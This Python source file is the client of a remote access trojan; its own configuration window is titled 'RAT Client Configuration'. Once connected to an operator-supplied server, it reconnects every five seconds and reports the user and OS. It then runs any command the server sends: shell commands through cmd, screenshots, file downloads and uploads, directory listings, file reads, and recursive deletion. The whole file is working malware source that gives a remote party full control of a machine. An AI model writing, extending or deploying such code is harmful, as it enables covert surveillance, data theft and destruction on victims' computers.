import socket
import subprocess
import json
import os
import base64
import time
from PIL import Image
import platform
import shutil
import tkinter as tk
from tkinter import messagebox
import threading
import ctypes
from ttkthemes import ThemedTk

try:
    import win32gui
    import win32ui
    import win32con
    import win32api

    WIN_AVAILABLE = True
except Exception:
    WIN_AVAILABLE = False

def take_screenshot():
    if not WIN_AVAILABLE:
        raise RuntimeError("Screenshot only supported on Windows in this client build.")
    try:
        ctypes.windll.user32.SetProcessDPIAware()
    except AttributeError:
        pass # For older Windows versions
    hdesktop = win32gui.GetDesktopWindow()
    width, height = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN), win32api.GetSystemMetrics(
        win32con.SM_CYVIRTUALSCREEN)
    left, top = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN), win32api.GetSystemMetrics(
        win32con.SM_YVIRTUALSCREEN)
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    bmpinfo = screenshot.GetInfo()
    bmpstr = screenshot.GetBitmapBits(True)
    img = Image.frombuffer('RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), bmpstr, 'raw', 'BGRX', 0, 1)
    mem_dc.DeleteDC()
    img_dc.DeleteDC()
    win32gui.ReleaseDC(hdesktop, desktop_dc)
    win32gui.DeleteObject(screenshot.GetHandle())
    return img


def reliable_send(sock, data_dict):
    """将字典可靠地编码为JSON并附加换行符后发送"""
    try:
        json_data = json.dumps(data_dict).encode('utf-8') + b'\n'
        sock.sendall(json_data)
    except socket.error as e:
        print(f"[错误] 发送数据时发生Socket错误: {e}")
        raise


# --- command handlers (mapping) ---
def handle_cd(arg, state):
    if not arg:
        return {"output": "错误: 'cd' 需要目录参数。"}
    try:
        os.chdir(arg)
        state['cwd'] = os.getcwd()
        return {"output": f"已切换目录到: {state['cwd']}"}
    except Exception as e:
        return {"output": f"切换目录错误: {e}"}


def handle_download(arg, state):
    if not arg:
        return {"output": "错误: 'download' 需要文件路径。"}
    if os.path.exists(arg) and os.path.isfile(arg):
        with open(arg, 'rb') as f:
            encoded_content = base64.b64encode(f.read()).decode('utf-8')
        return {"file": os.path.basename(arg), "data": encoded_content, "source_path": arg}
    else:
        return {"output": f"错误: 文件 '{arg}' 不存在。"}


def handle_screenshot(arg, state):
    try:
        img = take_screenshot()
        img_path = "screen_temp.png"
        img.save(img_path)
        with open(img_path, 'rb') as f:
            encoded_img = base64.b64encode(f.read()).decode('utf-8')
        os.remove(img_path)
        return {"file": "screenshot.png", "data": encoded_img}
    except Exception as e:
        return {"output": f"截图失败: {e}"}


def handle_exec(arg, state):
    """把 action 当作可执行命令（cmd /c）"""
    full_command = arg or ""
    try:
        startupinfo = subprocess.STARTUPINFO() if os.name == 'nt' else None
        if startupinfo:
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        if os.name == 'nt':
            result = subprocess.run(['cmd.exe', '/c', full_command], capture_output=True, text=False,
                                    cwd=state['cwd'], timeout=30, check=False, startupinfo=startupinfo)
            output = (result.stdout + result.stderr).decode('gbk', errors='replace')
        else:
            result = subprocess.run(full_command, shell=True, capture_output=True, text=True, cwd=state['cwd'],
                                    timeout=30)
            output = result.stdout + result.stderr
        if not output.strip() and result.returncode != 0:
            output = f"命令执行完毕，退出码: {result.returncode}，但无输出。"
        return {"output": output}
    except Exception as e:
        return {"output": f"执行命令时发生错误: {e}"}


def handle_list_dir(arg, state):
    path = arg or state['cwd']
    try:
        entries = []
        with os.scandir(path) as it:
            for e in it:
                try:
                    stat = e.stat()
                    entries.append({
                        "name": e.name,
                        "is_dir": e.is_dir(),
                        "size": stat.st_size,
                        "mtime": int(stat.st_mtime)
                    })
                except Exception:
                    entries.append({"name": e.name, "is_dir": e.is_dir(), "size": 0, "mtime": 0})
        return {"dir_list": {"cwd": os.path.abspath(path), "entries": entries}}
    except Exception as e:
        return {"output": f"列目录失败: {e}"}


def handle_read_file(arg, state):
    if not arg:
        return {"output": "错误: read_file 需要路径参数。"}
    if not os.path.exists(arg) or not os.path.isfile(arg):
        return {"output": f"错误: 文件 '{arg}' 不存在或不是文件。"}
    try:
        size = os.path.getsize(arg)
        if size > 200 * 1024:
            return {"output": f"文件过大（{size} bytes），无法直接在线打开。请下载。"}
        with open(arg, 'rb') as f:
            raw = f.read()
        try:
            text = raw.decode('utf-8')
        except:
            try:
                text = raw.decode('gbk', errors='replace')
            except:
                text = base64.b64encode(raw).decode('utf-8')
                return {"file_text": text, "path": arg, "is_base64": True}
        return {"file_text": text, "path": arg, "is_base64": False}
    except Exception as e:
        return {"output": f"读取文件失败: {e}"}


def handle_delete_path(arg, state):
    if not arg:
        return {"output": "错误: delete_path 需要路径参数。"}
    try:
        if os.path.isdir(arg):
            shutil.rmtree(arg)
            return {"output": f"目录已删除: {arg}"}
        elif os.path.isfile(arg):
            os.remove(arg)
            return {"output": f"文件已删除: {arg}"}
        else:
            return {"output": "路径不存在。"}
    except Exception as e:
        return {"output": f"删除失败: {e}"}


def handle_upload_file_chunk(cmd, state):
    filename = cmd.get('filename')
    chunk_index = cmd.get('chunk_index', 0)
    data_b64 = cmd.get('data', '')
    is_last = cmd.get('is_last', False)
    if not filename or data_b64 is None:
        return {"output": "上传块缺少参数。"}
    try:
        mode = 'ab'
        with open(filename, mode) as f:
            f.write(base64.b64decode(data_b64))
        if is_last:
            return {"upload_ack": f"上传完成: {filename}"}
        else:
            return {"output": f"已写入块 {chunk_index} (文件: {filename})"}
    except Exception as e:
        return {"output": f"写入上传文件失败: {e}"}


COMMAND_HANDLERS = {
    "cd": lambda arg, state: handle_cd(arg, state),
    "download": lambda arg, state: handle_download(arg, state),
    "screenshot": lambda arg, state: handle_screenshot(arg, state),
    "exec": lambda arg, state: handle_exec(arg, state),
    "list_dir": lambda arg, state: handle_list_dir(arg, state),
    "read_file": lambda arg, state: handle_read_file(arg, state),
    "delete_path": lambda arg, state: handle_delete_path(arg, state),
    "upload_file_chunk": lambda arg, state: handle_upload_file_chunk(arg, state)
}


def main_loop(server_ip, server_port):
    """
    客户端主函数，循环连接和处理命令。
    现在接受 server_ip 和 server_port 作为参数。
    """
    buffer = b''
    state = {'cwd': os.getcwd()}
    while True:
        client_socket = None
        try:
            print(f"[调试] 尝试连接服务器 {server_ip}:{server_port}...")
            client_socket = socket.socket()
            client_socket.connect((server_ip, server_port))
            print(f"[+] 已连接到服务器 {server_ip}:{server_port}")
            state['cwd'] = os.getcwd()

            os_info = f"{platform.system()} {platform.release()}"

            try:
                reliable_send(client_socket,
                              {"status": "connected", "cwd": state['cwd'], "user": os.getlogin(), "os": os_info})
            except Exception as e:
                print(f"[错误] 发送初始连接信息失败: {e}")
                break

            while True:
                try:
                    part = client_socket.recv(4096)
                    if not part:
                        print("[调试] 服务器关闭了连接。")
                        break
                    buffer += part
                except socket.error as e:
                    print(f"[错误] 接收数据时发生Socket错误: {e}")
                    break

                while b'\n' in buffer:
                    message, buffer = buffer.split(b'\n', 1)
                    try:
                        cmd_data = json.loads(message.decode('utf-8'))
                    except (json.JSONDecodeError, UnicodeDecodeError) as e:
                        print(f"[错误] 解析收到的消息失败: {e}")
                        continue

                    action = cmd_data.get("action")
                    if not action:
                        try:
                            reliable_send(client_socket, {"output": "错误: 命令缺少 'action' 字段"})
                        except:
                            pass
                        continue

                    try:
                        handler = COMMAND_HANDLERS.get(action)
                        if handler:
                            if action == "upload_file_chunk":
                                result = handler(cmd_data, state)
                            else:
                                arg = cmd_data.get("arg", "")
                                result = handler(arg, state)
                        else:
                            result = handle_exec(
                                action + (" " + cmd_data.get("arg", "") if cmd_data.get("arg") else ""), state)

                        if isinstance(result, dict):
                            reliable_send(client_socket, result)
                        else:
                            reliable_send(client_socket, {"output": str(result)})
                    except socket.error as e:
                        print(f"[错误] 发送响应时Socket错误: {e}")
                        break
                    except Exception as e_proc:
                        print(f"[错误] 处理命令时发生错误: {e_proc}")
                        try:
                            reliable_send(client_socket, {"output": f"处理命令时发生错误: {e_proc}"})
                        except:
                            break

        except socket.error as e_sock:
            print(f"[错误] 客户端 Socket 异常: {e_sock}")
        except Exception as e_main:
            print(f"[错误] 客户端主循环异常: {e_main}")
        finally:
            if client_socket: client_socket.close()

        buffer = b''
        print("[调试] 5秒后尝试重新连接...")
        time.sleep(5)


class ClientUI(ThemedTk):  # 使用 ThemedTk 替代 tk.Tk
    def __init__(self, connect_callback):
        super().__init__(theme="equilux")  # 选择一个好看的主题，例如 "equilux"
        self.connect_callback = connect_callback
        self.title("RAT Client Configuration")
        self.geometry("400x250")  # 稍微加大窗口
        self.resizable(False, False)  # 禁止调整窗口大小

        # 定义字体
        self.font_large = ("Helvetica", 12)
        self.font_button = ("Helvetica", 12, "bold")

        self.create_widgets()
        self.connection_thread = None

        # 绑定回车键事件
        self.bind('<Return>', lambda event=None: self.start_connection())

    def create_widgets(self):
        main_frame = tk.Frame(self, padx=25, pady=25)
        main_frame.pack(fill="both", expand=True)

        tk.Label(main_frame, text="Server IP:", font=self.font_large).grid(row=0, column=0, sticky="w", pady=10)
        self.ip_entry = tk.Entry(main_frame, font=self.font_large)
        self.ip_entry.insert(0, "192.168.242.102")
        self.ip_entry.grid(row=0, column=1, pady=10, sticky="ew")

        tk.Label(main_frame, text="Server Port:", font=self.font_large).grid(row=1, column=0, sticky="w", pady=10)
        self.port_entry = tk.Entry(main_frame, font=self.font_large)
        self.port_entry.insert(0, "2383")
        self.port_entry.grid(row=1, column=1, pady=10, sticky="ew")

        tk.Label(main_frame, text="Key:", font=self.font_large).grid(row=2, column=0, sticky="w", pady=10)
        self.key_entry = tk.Entry(main_frame, font=self.font_large, show="*")
        self.key_entry.grid(row=2, column=1, pady=10, sticky="ew")

        self.connect_button = tk.Button(main_frame, text="Connect", command=self.start_connection,
                                        font=self.font_button, relief="groove")
        self.connect_button.grid(row=3, column=0, columnspan=2, pady=15, sticky="ew")

        self.status_label = tk.Label(main_frame, text="Status: Not Connected", fg="#FF4C4C", font=self.font_large)
        self.status_label.grid(row=4, column=0, columnspan=2)

        main_frame.grid_columnconfigure(1, weight=1)

    def start_connection(self):
        self.ip = self.ip_entry.get().strip()
        self.port = self.port_entry.get().strip()
        # self.key = self.key_entry.get() # Key is not used in your current logic

        if not self.ip or not self.port.isdigit():
            messagebox.showerror("Invalid Input", "Please enter a valid IP address and port number.")
            return

        self.connect_button["state"] = "disabled"
        self.status_label.config(text="Status: Connecting...", fg="#FFA500")

        self.connection_thread = threading.Thread(target=self.run_connection)
        self.connection_thread.daemon = True
        self.connection_thread.start()

    def run_connection(self):
        try:
            self.update_status("Connected", "#00C853")
            self.connect_callback(self.ip, int(self.port))
        except Exception as e:
            self.update_status(f"Connection Failed: {e}", "#FF4C4C")
            self.connect_button["state"] = "normal"

    def update_status(self, text, color):
        self.status_label.config(text=f"Status: {text}", fg=color)
        if text.startswith("Connection Failed"):
            self.connect_button["state"] = "normal"


if __name__ == '__main__':
    def on_connect_button_click(ip, port):
        # 启动主循环，并在一个新线程中运行，以免阻塞UI
        main_thread = threading.Thread(target=main_loop, args=(ip, port), daemon=True)
        main_thread.start()


    # 实例化并运行UI
    app = ClientUI(on_connect_button_click)
    app.mainloop()